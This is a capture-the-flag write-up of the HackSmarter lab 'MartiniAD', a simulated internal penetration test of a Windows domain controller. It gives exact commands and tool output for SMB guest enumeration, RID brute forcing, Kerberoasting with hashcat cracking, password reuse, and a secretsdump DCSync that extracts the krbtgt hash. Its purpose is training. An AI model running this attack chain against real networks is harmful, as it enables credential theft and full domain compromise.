---
title: "MartiniAD"
platform: "HackSmarter"
category: "Active Directory"
difficulty: "Easy"
date: 2026-05-16
os: "Windows Server 2025"
tags: ["windows", "active-directory", "smb", "guest-access", "kerberoasting", "password-reuse", "secretsdump", "impacket", "bloodyad", "rid-brute", "ntds", "domain-compromise"]
---

<div style="text-align: center;">
  <img src="/assets/images/ctf/martiniad/banner.png" alt="MartiniAD Banner" style="max-width: 100%;" />
</div>

---

## Scenario

Martini Bars is a corporate branch office of an adult beverage company that recently suffered a corporate breach. The organization's compliance and risk team mandated an internal penetration test to assess exposure and validate security controls at the branch level. The Hack Smarter team was engaged to perform a black-box internal assessment with no prior knowledge of the environment.

---

## Executive Summary

- **Guest Account Enabled with Writable Share** — The built-in Guest account had READ/WRITE access to a custom `notes` share on the domain controller, exposing plaintext credentials stored in a personal notes file.
- **Kerberoastable Service Account with Weak Password** — `ATHENA_SVC` had a registered SPN and was protected by a weak RC4-encrypted password crackable with a common wordlist.
- **Password Reuse — Service Account to Tier 0 Admin** — The cracked service account password was reused on the associated `athena.t0` Tier 0 administrative account, granting Domain Admin access.
- **Full Domain Compromise** — Secretsdump via DRSUAPI extracted the complete NTDS credential database, including the KRBTGT hash enabling Golden Ticket forgery.

**Risk Rating:** Critical

---

## Scope

| Host | IP Address | Operating System | Role |
|------|------------|------------------|------|
| DC01 | 10.0.19.195 | Windows Server 2025 Build 26100 | Domain Controller |

**Domain:** `DRY.MARTINI.BARS`

---

# Enumeration

## SMB Null Session and Guest Enumeration

The assessment began with unauthenticated SMB enumeration against the domain controller while the Nmap scan ran in parallel. A null session reveals a non-standard `notes` share. Authenticating as the built-in Guest account — which requires no password — confirms full READ/WRITE access.

```bash
nxc smb 10.0.19.195 -u '' -p '' --shares
```

```
SMB         10.0.19.195     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:None)
SMB         10.0.19.195     445    DC01             [+] DRY.MARTINI.BARS\:
SMB         10.0.19.195     445    DC01             Share           Permissions     Remark
SMB         10.0.19.195     445    DC01             -----           -----------     ------
SMB         10.0.19.195     445    DC01             ADMIN$                          Remote Admin
SMB         10.0.19.195     445    DC01             C$                              Default share
SMB         10.0.19.195     445    DC01             IPC$                            Remote IPC
SMB         10.0.19.195     445    DC01             NETLOGON                        Logon server share
SMB         10.0.19.195     445    DC01             notes
SMB         10.0.19.195     445    DC01             SYSVOL                          Logon server share
```

```bash
nxc smb 10.0.19.195 -u 'guest' -p '' --shares
```

```
SMB         10.0.19.195     445    DC01             [+] DRY.MARTINI.BARS\guest:
SMB         10.0.19.195     445    DC01             Share           Permissions     Remark
SMB         10.0.19.195     445    DC01             -----           -----------     ------
SMB         10.0.19.195     445    DC01             IPC$            READ            Remote IPC
SMB         10.0.19.195     445    DC01             notes           READ,WRITE
SMB         10.0.19.195     445    DC01             SYSVOL                          Logon server share
```

The Guest account is enabled and has been granted READ/WRITE access to a custom `notes` share — a significant misconfiguration on a domain controller. Write access to a network share enables planting coercion payloads (`.lnk`, `.scf`) to capture Net-NTLMv2 hashes from any user who browses the share.

Two additional findings are immediately notable:

- **SMB signing not required** — the DC is not enforcing message signing, leaving it susceptible to NTLM relay attacks.
- **Guest account enabled on a DC** — guest access should be disabled in any production domain environment.

## Port Scan

```bash
nmap -sCV 10.0.19.195
```

```
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
53/tcp   open  domain             Simple DNS Plus
88/tcp   open  kerberos-sec       Microsoft Windows Kerberos (server time: 2026-05-17 04:34:34Z)
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
389/tcp  open  ldap               Microsoft Windows Active Directory LDAP (Domain: DRY.MARTINI.BARS)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap               Microsoft Windows Active Directory LDAP (Domain: DRY.MARTINI.BARS)
3389/tcp open  ssl/ms-wbt-server?
| rdp-ntlm-info:
|   DNS_Domain_Name: DRY.MARTINI.BARS
|   DNS_Computer_Name: DC01.DRY.MARTINI.BARS
|   Product_Version: 10.0.26100

Host script results:
| smb2-security-mode:
|   311:
|_    Message signing enabled but not required
```

Standard Active Directory port profile confirming a single domain controller running Windows Server 2025. The `/etc/hosts` file was updated using NetExec's built-in generator to ensure all subsequent tools resolve domain names correctly.

```bash
nxc smb 10.0.19.195 -u 'guest' -p '' --generate-hosts-file /etc/hosts
```

---

# Credential Discovery

## Share Indexing with spider_plus

`spider_plus` recursively indexes all readable share content and saves file metadata to a structured JSON file — providing a complete inventory without manually traversing subdirectories.

```bash
nxc smb 10.0.19.195 -u 'guest' -p '' -M spider_plus
```

```
SPIDER_PLUS 10.0.19.195     445    DC01             [*] SMB Writable Shares:  1 (notes)
SPIDER_PLUS 10.0.19.195     445    DC01             [*] Total files found:    1
SPIDER_PLUS 10.0.19.195     445    DC01             [+] Saved share-file metadata to "/root/.nxc/modules/nxc_spider_plus/10.0.19.195.json".
```

```json
{
  "notes": {
    "notes.txt": {
      "atime_epoch": "2026-01-17 08:38:47",
      "mtime_epoch": "2026-01-20 10:11:00",
      "size": "129 B"
    }
  }
}
```

The share contains a single file modified January 20 — recent activity from a legitimate user. The file was downloaded and inspected directly.

## Plaintext Credentials in notes.txt

```bash
cat notes.txt
```

```
- Order more gin for lakeside
- Look for an engagement ring
- Check that notes works from Linux Mint

creds
mprice:<redacted>
```

A domain user stored plaintext credentials in a personal notes file on a share accessible to the Guest account. The recovered account is `mprice` — Martin Price, identifiable from the domain.

**Credentials:** `mprice` : `<redacted>`

## Credential Validation

```bash
nxc smb 10.0.19.195 -u 'mprice' -p '<redacted>' --shares
```

```
SMB         10.0.19.195     445    DC01             [+] DRY.MARTINI.BARS\mprice:<redacted> (Guest)
SMB         10.0.19.195     445    DC01             Share           Permissions     Remark
SMB         10.0.19.195     445    DC01             -----           -----------     ------
SMB         10.0.19.195     445    DC01             IPC$            READ            Remote IPC
SMB         10.0.19.195     445    DC01             notes           READ,WRITE
```

Authentication succeeds but the account is flagged `(Guest)` — no domain group memberships beyond the default guest profile. However, `mprice` is a valid Kerberos principal, which is sufficient to perform a Kerberoasting attack against any service account with a registered SPN.

---

# Kerberoasting

## Domain Enumeration via RID Brute Force

With valid domain credentials, RID cycling enumerates all domain objects regardless of LDAP restrictions. The technique requests SIDs sequentially by incrementing the RID component and resolves each to an account name via SMB.

```bash
nxc smb 10.0.19.195 -u mprice -p '<redacted>' --rid-brute
```

```
SMB         10.0.19.195     445    DC01             [+] DRY.MARTINI.BARS\mprice:<redacted>
SMB         10.0.19.195     445    DC01             500: DRY\Administrator (SidTypeUser)
SMB         10.0.19.195     445    DC01             501: DRY\Guest (SidTypeUser)
SMB         10.0.19.195     445    DC01             502: DRY\krbtgt (SidTypeUser)
SMB         10.0.19.195     445    DC01             512: DRY\Domain Admins (SidTypeGroup)
SMB         10.0.19.195     445    DC01             1104: DRY\mprice (SidTypeUser)
SMB         10.0.19.195     445    DC01             1105: DRY\athena.t0 (SidTypeUser)
SMB         10.0.19.195     445    DC01             1106: DRY\ATHENA_SVC (SidTypeUser)
```

Three non-default accounts identified:

- **`mprice`** — Martin Price, owner of the compromised notes file.
- **`athena.t0`** — Naming convention suggests a tiered administrative account (`t0` = Tier 0 — the highest privilege tier in a tiered AD model).
- **`ATHENA_SVC`** — Service account. High-priority Kerberoasting target due to typically elevated privileges and infrequent password rotation.

## SPN Discovery and Ticket Request

Any authenticated domain user can request a Kerberos service ticket (TGS) for an account with a registered Service Principal Name. The resulting ticket is encrypted with the service account's NT hash and can be cracked offline without any interaction with the account.

```bash
GetUserSPNs.py DRY.MARTINI.BARS/mprice:'<redacted>' -dc-ip 10.0.19.195
```

```
ServicePrincipalName         Name        MemberOf                                                         PasswordLastSet             LastLogon
---------------------------  ----------  ---------------------------------------------------------------  --------------------------  ---------
HTTP/athena.dry.martini.bar  ATHENA_SVC  CN=Remote Management Users,CN=Builtin,DC=DRY,DC=MARTINI,DC=BARS  2026-01-20 10:20:32.856622  <never>
```

`ATHENA_SVC` has a registered SPN (`HTTP/athena.dry.martini.bar`) and is a member of **Remote Management Users** — meaning a successful credential recovery grants WinRM access to the domain controller. The account has never logged on interactively, consistent with a provisioned-and-abandoned service account. The TGS was requested and saved for offline cracking.

```bash
GetUserSPNs.py DRY.MARTINI.BARS/mprice:'<redacted>' -request -outputfile athena_svc -dc-ip 10.0.19.195
```

```
$krb5tgs$23$*ATHENA_SVC$DRY.MARTINI.BARS$DRY.MARTINI.BARS/ATHENA_SVC*$<redacted>
```

The `$23$` prefix indicates **RC4-HMAC** (etype 23) encryption — significantly faster to crack than AES-based tickets (etype 17/18). RC4 Kerberoasting is possible when the domain functional level or the account's `msDS-SupportedEncryptionTypes` attribute does not mandate AES.

## Offline Cracking with Hashcat

```bash
hashcat -m 13100 athena_svc /usr/share/wordlists/rockyou.txt
```

```
$krb5tgs$23$*ATHENA_SVC$...<redacted>:<redacted>
```

| Account | Password |
|---|---|
| `ATHENA_SVC` | `<redacted>` |

The password cracked against the standard `rockyou.txt` wordlist — a basic dictionary attack. Service accounts with passwords of this quality are a common finding in environments where the service account password policy is not differentiated from the standard user policy.

---

# Password Reuse and Privilege Escalation

## User Enumeration via BloodyAD

With `ATHENA_SVC` credentials validated, BloodyAD was used to enumerate all user objects in the domain directory via LDAP.

```bash
bloodyad -u athena_svc -p '<redacted>' -d DRY.MARTINI.BARS --host 10.0.19.195 get children --otype useronly
```

```
distinguishedName: CN=Administrator,CN=Users,DC=DRY,DC=MARTINI,DC=BARS
distinguishedName: CN=Guest,CN=Users,DC=DRY,DC=MARTINI,DC=BARS
distinguishedName: CN=krbtgt,CN=Users,DC=DRY,DC=MARTINI,DC=BARS
distinguishedName: CN=Martin Price,CN=Users,DC=DRY,DC=MARTINI,DC=BARS
distinguishedName: CN=athena.t0,CN=Users,DC=DRY,DC=MARTINI,DC=BARS
distinguishedName: CN=ATHENA_SVC,CN=Managed Service Accounts,DC=DRY,DC=MARTINI,DC=BARS
```

`athena.t0` is confirmed as a distinct user object separate from the `ATHENA_SVC` managed service account. The `t0` naming convention strongly implies this is the personal Tier 0 administrative account for the same individual — a common pattern where administrators share a password between their service account and their personal admin account.

## Password Reuse — athena.t0

The `ATHENA_SVC` cracked password was tested against `athena.t0`. Authentication succeeds and the account is flagged `(admin)` — indicating membership in the local Administrators group or Domain Admins.

```bash
nxc smb 10.0.19.195 -u athena.t0 -p '<redacted>' --shares
```

```
SMB         10.0.19.195     445    DC01             [+] DRY.MARTINI.BARS\athena.t0:<redacted> (admin)
SMB         10.0.19.195     445    DC01             Share           Permissions     Remark
SMB         10.0.19.195     445    DC01             -----           -----------     ------
SMB         10.0.19.195     445    DC01             ADMIN$          READ,WRITE      Remote Admin
SMB         10.0.19.195     445    DC01             C$              READ,WRITE      Default share
SMB         10.0.19.195     445    DC01             IPC$            READ            Remote IPC
SMB         10.0.19.195     445    DC01             NETLOGON        READ,WRITE      Logon server share
SMB         10.0.19.195     445    DC01             notes           READ,WRITE
SMB         10.0.19.195     445    DC01             SYSVOL          READ,WRITE      Logon server share
```

Full READ/WRITE access to `ADMIN$`, `C$`, `NETLOGON`, and `SYSVOL` confirms domain administrative access. The attack chain is complete — a single compromised service account password yielded Domain Admin through direct credential reuse.

**Credentials:** `athena.t0` : `<redacted>`

---

# Domain Compromise

## NTDS Extraction via secretsdump

With Domain Admin credentials, `secretsdump.py` was used to remotely extract all credential material from the domain controller. The tool leverages the **DRSUAPI** replication protocol — the same mechanism used by domain controllers to synchronize the NTDS.DIT database — to pull all domain account hashes without touching the filesystem directly.

```bash
secretsdump "athena.t0":"<redacted>"@"10.0.19.195"
```

```
[*] Target system bootKey: <redacted>
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:<redacted>
Guest:501:<redacted>
DefaultAccount:503:<redacted>
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
DRY\DC01$:aes256-cts-hmac-sha1-96:<redacted>
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:<redacted>
Guest:501:<redacted>
krbtgt:502:<redacted>
DRY.MARTINI.BARS\mprice:1104:<redacted>
DRY.MARTINI.BARS\athena.t0:1105:<redacted>
DRY.MARTINI.BARS\ATHENA_SVC:1106:<redacted>
DC01$:1000:<redacted>
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:<redacted>
krbtgt:aes128-cts-hmac-sha1-96:<redacted>
```

All domain credential material successfully extracted. The NTDS dump confirms `ATHENA_SVC` and `athena.t0` share identical NT hashes — forensic confirmation of the password reuse finding.

## Objective — KRBTGT NT Hash

The `krbtgt` account NT hash is the highest-impact credential recoverable from a domain compromise. Possession of this hash enables forging **Golden Tickets** — Kerberos TGTs that are valid for any account, any privilege level, and any service in the domain — created entirely offline, with no further interaction with the domain controller required.

| Account | NT Hash |
|---|---|
| `krbtgt` | `<redacted>` |

---

## Credentials Summary

```
Phase 1 - Initial Access
────────────────────────────────────────────────────────────────
mprice          : <redacted>       → notes.txt on guest-accessible SMB share

Phase 2 - Kerberoasting
────────────────────────────────────────────────────────────────
ATHENA_SVC      : <redacted>       → Kerberoast TGS cracked with rockyou.txt

Phase 3 - Domain Admin
────────────────────────────────────────────────────────────────
athena.t0       : <redacted>       → Password reuse from ATHENA_SVC

Phase 4 - Domain Compromise
────────────────────────────────────────────────────────────────
krbtgt          : <redacted>       → DRSUAPI secretsdump (Golden Ticket capable)
Administrator   : <redacted>       → DRSUAPI secretsdump
```

---

## Tools Used

- **NetExec (nxc)** — Unauthenticated SMB enumeration, share access validation, `spider_plus` content indexing, `--generate-hosts-file`, RID brute force
- **Nmap** — Port scanning and service fingerprinting
- **Impacket GetUserSPNs.py** — SPN discovery and Kerberos TGS ticket request
- **Impacket secretsdump.py** — Remote NTDS extraction via DRSUAPI replication protocol
- **Hashcat** — Offline RC4 Kerberoast hash cracking (`-m 13100`) against `rockyou.txt`
- **BloodyAD** — LDAP user object enumeration with low-privilege credentials

---

## References

- [HackTricks — Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)
- [HackTricks — DCSync / secretsdump](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
- [NetExec Wiki — SMB Enumeration](https://www.netexec.wiki/smb-protocol/enumeration)
- [Impacket — GetUserSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
